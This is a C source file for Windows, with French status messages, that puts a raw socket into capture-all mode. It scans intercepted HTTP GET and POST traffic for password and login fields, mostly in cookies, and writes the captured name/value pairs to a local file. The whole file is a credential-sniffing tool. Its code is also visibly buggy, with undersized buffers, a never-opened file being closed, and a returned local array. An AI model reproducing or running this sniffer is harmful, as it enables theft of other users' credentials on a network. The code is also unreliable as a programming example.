//#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include "sniffer.h"
#include "file.h"
#pragma comment(lib,"ws2_32.lib")

FILE * logfile;
int tcp = 0;
int i;
char own_ip[16];

int initSniffer(){
    int wsaio;
	int i;
	int j = 1;
	int selInt;
	char *buffer;
	char hostname[100];
	WSADATA wsa;
	SOCKET sniffer;
	SOCKADDR_IN dest;
	SOCKADDR_IN source;
	IN_ADDR addr;
	HOSTENT *local;






	printf("Initialisation de Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("fail ! ErrCode : %d", WSAGetLastError());
		return 1;
	}
	printf("FAIT !\n");

	printf("Creation de la socket RAW...");

	sniffer = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	//setsockopt(sniffer, IPPROTO_TCP, SO_BROADCAST, (char *)&optval, sizeof(optval));
	//bind(sniffer, (struct sockaddr *)&dest, sizeof(dest));
	if (sniffer == INVALID_SOCKET) {
	printf("/!\\ INVALID_SOCKET /!\\\n ErrCode : %d\n",WSAGetLastError());
	return 1;
	}
	printf("socket RAW cree !\n");

	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
	{
	printf("ErrCode : %d \n", WSAGetLastError());
	return 1;
	}
	printf("Host name : %s\n", hostname);

	local = gethostbyname(hostname);
	if (local == NULL)
	{
	printf("ErrCode : %d\n", WSAGetLastError());
	}
	printf("type addr : %d\n\n",local->h_addrtype);


	//for(i=0;local->h_addr_list[i] != 0;i++){
    memcpy(&addr, local->h_addr_list[0],sizeof(struct in_addr));
    //break;
	//}

	//scanf("%d",&selInt);
	memset(&dest, 0, sizeof(dest));
	memcpy(&dest.sin_addr.s_addr , local->h_addr_list[0], sizeof(dest.sin_addr.s_addr));
	dest.sin_family = AF_INET;
	dest.sin_port = htons(0);

  if((bind(sniffer,(SOCKADDR *)&dest, sizeof(dest))) == SOCKET_ERROR)
  {
      printf("...bind(%s)\n...mais cela n'as aucun effet :)\n ErrCode : %d",inet_ntoa(addr),WSAGetLastError());
      return 1;
  }
  printf("Bind reussi !\n");


  printf("Preparation du socket 'sniffeur'...\n");
  wsaio = (int)WSAIoctl(sniffer,SIO_RCVALL, &j, sizeof(j), 0, 0,(LPDWORD)&selInt, 0, 0);
  printf("WSAIoctl :return: %d\n",wsaio);


  if(wsaio != 0)
  {
      printf("ErrCode : %d : : %d",WSAGetLastError(),wsaio);
      return 1;
  }
  printf("Socket 'sniffeur' pret !");
  printf("\n\n**:: Demarrage du 'SNIFF' ::**\n\n");

  startSniff(sniffer);


	closesocket(sniffer);
	WSACleanup();
	return 0;
}

void startSniff(SOCKET sniffer){
	char* buffer;
	int size;
	do{
		buffer = calloc(10000,sizeof(char));
		size = recvfrom(sniffer, buffer, 10000,0,0,0);

		if (size > 0)
		{
			fflush(stdout);
			processPacket(buffer,size);
		}
		else
		{
			printf("error\n");
		}

		free(buffer);

	}while(size > 0);
}

void processPacket(char* buffer,int size){
	iphdr = (IPV4_HDR *)buffer;

	if (iphdr->ip_protocol == 6){
    	iphdrlen = iphdr->ip_header_len*4;
    	tcpheader = (TCP_HDR *)(buffer+iphdrlen);
    	checkRequest(buffer+iphdrlen+tcpheader->data_offset*4,size-tcpheader->data_offset*4-iphdrlen);
	}
}

int checkRequest(char* buffer,int Size){

	char* request_type;
	char * result_solved;
	char c;

	request_type = malloc(4*sizeof(char));
    strncpy(request_type,buffer,3);
    request_type[3] = '\0';
    if((strcmp(request_type,"POS") == 0 || strcmp(request_type,"GET") == 0 )){
        char* result_str = malloc((Size+1)*sizeof(char));

        //loop over each character and print
        for(i=0 ; i < Size ; i++){
            c = buffer[i];
            c = ( c >=32 && c <=128) ? (unsigned char) c : '.';
            result_str[i] = c;
            printf("%c",c);
        }
        strcat(result_str,"\0");
        printf("!\n");

        if(checkWords(result_str)==1){
            findKeywords(result_str,Size);
    	}
   	fclose(logfile);
    }
}

char * findKeywords(char* tcpdata,int size){
    int i;
    char* tmp = malloc((size+1)*sizeof(char));
	char* goto_cookie = malloc((size+1) *sizeof(char));

	if(strstr(tcpdata,"Cookie") != NULL){
           tmp = strstr(tcpdata,"Cookie");
        strcpy(goto_cookie,tmp);
        strcat(goto_cookie,"\0");
    }
    char* current_str = malloc(strlen(goto_cookie) *sizeof(char));
    char* previous_str = malloc(strlen(goto_cookie) *sizeof(char));
    char* result_str = malloc(strlen(goto_cookie) *sizeof(char));

    char * keywords_list[] =
    {
        "password=","passwd=","pwd=","motdepasse=","mdp=","pass=",
        "login=","id=","pseudo=","name="
    };

    for (i = 0; i < 10; i++){
    	if(strstr(goto_cookie,keywords_list[i]) != NULL){
            tmp = strstr(goto_cookie,keywords_list[i]);
            strcpy(current_str,tmp);
            strcat(current_str,"\0");

            if (strlen(previous_str) > 1)
            {
            	if(strlen(current_str)>strlen(previous_str)){
                    strcpy(result_str,current_str);
                    strcat(result_str,"\0");
                }
            }
            strcpy(previous_str,current_str);
            strcat(previous_str,"\0");
	    }
	}

    char returntab[strlen(result_str)];
    strcpy(returntab,result_str);

    free(tcpdata);
    if (strlen(returntab) > 2){
        separatePair(&returntab);
    	return returntab;
    }
    else{
    	return NULL;
    }
}

int checkWords(char * data){
    char * keywords_list[] =
    {
        "password=","passwd=","pwd=","motdepasse=","mdp=","pass=",
        "login=","id=","pseudo=","name="
    };

    for(i = 0;i<10;i++){
        if(strstr(data,keywords_list[i]) != NULL)
        {
            return 1;
        }
    }
    return 0;
}

void separatePair(char* request){
    char name[200] = "data.ter";
    FILE *fp = fopen(name,"ab");
    const char var_separator[2] = "&";
    const char pair_separator[2] = "=";
    char* token;
    char* token2;
    char uni_pair[100][200];
    char pair[100][2][100];
    int i,j;

    startBlock(fp,"www.test.io");

    token = strtok(request, var_separator);
    for(i=0; token != NULL; i++ ) {
        strcpy( uni_pair[i], token );
        token = strtok(NULL, var_separator);

        token2 = strtok(uni_pair[i], pair_separator);
        for(j=0; token2 != NULL; j++ ) {
            strcpy( pair[i][j], token2 );
            printf("%s\n",pair[i][j]);
            token2 = strtok(NULL, pair_separator);
        }

        addData(fp,pair[i][0],pair[i][1]);
    }
    endBlock(fp);
    fclose(fp);
}
